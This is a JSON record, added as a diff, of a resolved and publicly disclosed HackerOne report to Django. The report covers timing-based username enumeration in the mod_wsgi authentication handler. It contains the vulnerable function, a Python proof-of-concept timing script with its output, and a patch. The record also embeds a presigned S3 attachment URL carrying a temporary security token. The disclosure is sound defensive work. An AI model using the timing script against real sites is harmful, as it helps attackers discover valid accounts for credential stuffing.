@@ -1,0 +1,120 @@
+{
+  "id": 3424977,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDI0OTc3",
+  "url": "https://hackerone.com/reports/3424977",
+  "title": "User enumeration via timing attack in Django mod_wsgi authentication backend leads to account discovery",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2025-11-13T22:04:52.739Z",
+  "submitted_at": "2025-11-13T22:04:52.795Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "stackered",
+    "url": "/stackered",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/vw8uf97yenmngw3n4n0pjtjla2ov/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23,
+    "url": "https://hackerone.com/django",
+    "handle": "django",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Django",
+      "twitter_handle": null,
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-02-04T13:06:28.227Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-02-04T13:00:06.087Z",
+  "team_member_agreed_on_going_public_at": "2026-02-04T13:06:28.114Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# User enumeration via timing attack when using mod_wsgi authentication backend\n\nHi Django Security Team,\n\n## Issue Description\n\nThe vulnerability exists in the `check_password` function in `django/contrib/auth/handlers/modwsgi.py`. When a non-existent username is provided, the function returns immediately without performing password verification:\n\n```python\ndef check_password(environ, username, password):\n    \"\"\"\n    Authenticate against Django's auth database.\n\n    mod_wsgi docs specify None, True, False as return value depending\n    on whether the user exists and authenticates.\n    \"\"\"\n    # db connection state is managed similarly to the wsgi handler\n    # as mod_wsgi may call these functions outside of a request/response cycle\n    db.reset_queries()\n    try:\n        try:\n            user = UserModel._default_manager.get_by_natural_key(username)\n        except UserModel.DoesNotExist:\n            return None\n        if not user.is_active:\n            return None\n        return user.check_password(password)\n    finally:\n        db.close_old_connections()\n```\n\n## Steps to Reproduce\n\n1. Launch the provided docker container to setup the testing environment. I tried to follow [the official documentation](https://docs.djangoproject.com/en/5.2/howto/deployment/wsgi/apache-auth/) to build this environment.\n\n```bash\ndocker build -t django-apache-auth .\ndocker run --rm -it -p 8000:80 django-apache-auth\n```\n\n2. Run the following Python script:\n\n```python\nimport requests\nfrom requests.auth import HTTPBasicAuth\n\nurl = \"http://localhost:8000/secret\"\nusername = \"admin\"\npassword = \"notthepassword\"\n\n#warmup\nresponse = requests.get(url, auth=HTTPBasicAuth(username, password))\nresponse = requests.get(url, auth=HTTPBasicAuth(username, password))\n\n# slow response\nresponse = requests.get(url, auth=HTTPBasicAuth(username, password))\nprint(response.elapsed.microseconds)\n\n# fast response\nusername = \"nonexistant\"\nresponse = requests.get(url, auth=HTTPBasicAuth(username, password))\nprint(response.elapsed.microseconds)\n\n# fast response\nusername = \"nonexistant\"\nresponse = requests.get(url, auth=HTTPBasicAuth(username, password))\nprint(response.elapsed.microseconds)\n\n# slow response\nusername = \"admin\"\nresponse = requests.get(url, auth=HTTPBasicAuth(username, password))\nprint(response.elapsed.microseconds)\n```\n\nThe script produces output similar to:\n\n```\n379669\n3090\n2347\n236157\n```\n\nThis clearly demonstrates that authentication attempts with existing usernames (`admin`) take significantly longer than attempts with non-existent usernames.\n\n## Impact\n\nThis timing attack allows attackers to enumerate valid usernames in the system, which can be used as a stepping stone for further attacks such as credential stuffing or brute force attempts focused on known valid accounts.\n\n## Remediation\n\nI suggest applying the same counter-measure implemented in the other authentication backend, namely calling `UserModel().set_password(password)` before returning `None` :\n\n```python\ndef check_password(environ, username, password):\n    \"\"\"\n    Authenticate against Django's auth database.\n\n    mod_wsgi docs specify None, True, False as return value depending\n    on whether the user exists and authenticates.\n    \"\"\"\n    # db connection state is managed similarly to the wsgi handler\n    # as mod_wsgi may call these functions outside of a request/response cycle\n    db.reset_queries()\n    try:\n        try:\n            user = UserModel._default_manager.get_by_natural_key(username)\n        except UserModel.DoesNotExist:\n            UserModel().set_password(password)\n            return None\n        if not user.is_active:\n            UserModel().set_password(password)\n            return None\n        return user.check_password(password)\n    finally:\n        db.close_old_connections()\n```\n\nWith this fix implemented, the previous PoC produces results like this:\n\n```\n339185\n340059\n342360\n342630\n```\n\nDemonstrating that it fixes the vulnerability.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5003473,
+      "file_name": "Dockerfile",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/otfdebp8s0clhutdd2enwe5xy10b?response-content-disposition=attachment%3B%20filename%3D%22Dockerfile%22%3B%20filename%2A%3DUTF-8%27%27Dockerfile&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXTI3ZXE6%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162516Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIAMFDo2Ti7D7PGhpiV4K9rLJIEQ0iTj2aOwjGOf35FtUAiA1A7ZOAnPQlyw17MYgBl0WLJIZ2b%2Bkp6kr5QN9A2Ii1CqyBQhAEAMaDDAxMzYxOTI3NDg0OSIMkgJgRdLBUeNdsbU4Ko8FfIICDE5Zp3Gow0N70LC%2BW54UQbYp3Beoyoz5%2BJ62ADMdZdJ2BJ6UuFFymbMgwMvRe6RqJHp2fcRcJDJ7u2a5OBGf6shAoeH7UKsge61QDnttfHfwqN6VGaQppCCtGO2D3dTJ2J%2F6wWApyw0LkRcoZiMr7oUGKXAyUEEkgKjqS6NdTrSpl9WDYsVOdAA1irnIJ4kZkTGJJiLfxmhxtVRfdzYeiMcfX0EvMClAp9qtKZawyfLcVMZcO27PXsiXE%2B7gIPVG5Q8I1FQ6eSLUMDNMxBpXSKJzGoLb5IkWcpMoTw5cDBYIBZF1ZydD%2FZuu0H%2F2VPaCzf%2BSMuyXTpRYtyD3GFMv15Bpfa%2BgzTsEiw4hgl0eDNsnv4hJRubajMjv9O0h87NzUScxHQsDfIqSHpF9ZhHUDv%2BJ7ZzX7j3muv7H6u%2BM9T1ojiwZ1JVHb1QJWjjf2z%2FtxhvBHLFC3KnA%2FZWycMkNAlZFPr%2Fe1iPhl3RpFOH9uuSWSQ%2BD39QoRMOQQM6LygLAz%2BLn1kZcSxg8Sb9ExDjgMLP3YIRDXfgPbvCx60P1kQvn5Mh7213IeA4lQqiQNB5UvhdB8GQKXSowt60Rux4oRUgazydvxqX%2BcvZhsKYp1v%2BM8nK%2FfSTaZ8oBErDvBl2Pl03rJXF6q2TSz2iJGIqOd79onq8Ex0%2FFbrgaWSF4WqXk8xV2M6eUVx04hbktMO3HCUb7ArjHETAc6b4j55uyQj6mRwsWfUsdkQ0%2BZOGcXVzCiWD0wyxfP3Y6twOMtz0uGWfUYy%2BHw9BGNzOO%2B8vu%2FoPmhNTVR9Kq5dTHy81ZVtvfQ%2FDav3np8mYz8rZm8%2F4jsgC3P1fCntm%2BP9aMgYGKjwvn%2Bj%2FqEyhbjrsK%2FTDHntjPBjqyAYB%2F%2BEVuGpkT2ffQxp%2FSGqr2GT9GMnUs02oWCHARA%2BLd8CGtbaGpsyLGDNODv%2Bzubqq5xUbPK6aXSuSFqTfJLGY2CdieJ7w954ciBo0g%2FXN4x9w4eR4xuQ65528H4AfBY7JdmTo3lG%2Fx6JB6jtlZDQ9rNX8mUtl1LuRjnOhYuMTAWThat5WLNTjeRraqZL5SUAEMJw0h9VfHXCfwi2Vd7aqR9lwslnfl77mrFFi%2BjUz6x4Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5acd2f678cff9c38f7fb4c2ee31eacbe375383b39134907e0529630c04e3c486",
+      "file_size": 2546,
+      "type": "application/octet-stream",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-03-06T13:00:06.170Z",
+  "allow_singular_disclosure_after": -4937109.913057079,
+  "singular_disclosure_allowed": true,
+  "vote_count": 61,
+  "voters": [
+    "zy9ard3",
+    "bl4ck-",
+    "mohaned0101",
+    "boonsuan1",
+    "2026",
+    "mohammadtayb",
+    "mr-inspector",
+    "officialdeadman",
+    "zinfinity",
+    "rootk1m",
+    "and 51 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
